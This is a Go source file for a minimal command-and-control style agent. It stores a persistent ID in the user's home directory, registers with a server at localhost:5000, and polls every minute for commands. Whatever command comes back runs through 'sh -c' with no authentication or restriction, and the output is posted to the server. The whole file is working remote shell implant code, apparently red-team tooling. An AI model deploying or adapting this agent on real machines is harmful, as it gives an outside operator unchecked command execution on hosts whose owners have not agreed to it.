// agent.go - Minimal polling agent with persistent ID
//
// Registers with the server
// Polls for commands
// Executes locally and returns results
// Agent ID persists between runs, stored in ~/.agent_id
//
// go mod init agent
// go get github.com/google/uuid
// go build -o agent agent.go

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/google/uuid"
)

const SERVER_URL = "http://localhost:5000"

var agentID string

// ---------- Agent ID Handling ----------

func getAgentIDFilePath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("[!] Could not determine home directory:", err)
		os.Exit(1)
	}
	return filepath.Join(home, ".agent_id")
}

func loadOrCreateAgentID() string {
	path := getAgentIDFilePath()

	// If file exists, read it
	if data, err := os.ReadFile(path); err == nil {
		return strings.TrimSpace(string(data))
	}

	// Otherwise create new ID
	newID := uuid.New().String()

	err := os.WriteFile(path, []byte(newID), 0600)
	if err != nil {
		fmt.Println("[!] Failed to write agent ID:", err)
	}

	return newID
}

// ---------- Server Communication ----------

func register() {
	payload := map[string]string{"id": agentID}
	jsonData, _ := json.Marshal(payload)

	_, err := http.Post(SERVER_URL+"/register", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("[!] Registration failed:", err)
		return
	}

	fmt.Println("[+] Registered as", agentID)
}

func getCommand() string {
	client := http.Client{Timeout: 5 * time.Second}

	resp, err := client.Get(SERVER_URL + "/get_command/" + agentID)
	if err != nil {
		fmt.Println("[!] Command check failed:", err)
		return ""
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var result map[string]string
	if err := json.Unmarshal(body, &result); err != nil {
		return ""
	}

	return result["command"]
}

func sendResult(result string) {
	payload := map[string]string{"result": result}
	jsonData, _ := json.Marshal(payload)

	_, err := http.Post(SERVER_URL+"/post_result/"+agentID,
		"application/json",
		bytes.NewBuffer(jsonData),
	)
	if err != nil {
		fmt.Println("[!] Failed to send result:", err)
	}
}

// ---------- Command Execution ----------

func runCommand(cmd string) string {
	switch cmd {
	case "info":
		return fmt.Sprintf("%s %s (%s)", runtime.GOOS, runtime.GOARCH, runtime.Version())
	case "ping":
		return "pong"
	default:
		out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, string(out))
		}
		return string(out)
	}
}

// ---------- Main Loop ----------

func main() {
	agentID = loadOrCreateAgentID()

	register()

	for {
		cmd := getCommand()
		if cmd != "" {
			fmt.Println("[*] Running command:", cmd)
			result := runCommand(cmd)
			sendResult(result)
		}

		time.Sleep(60 * time.Second)
	}
}
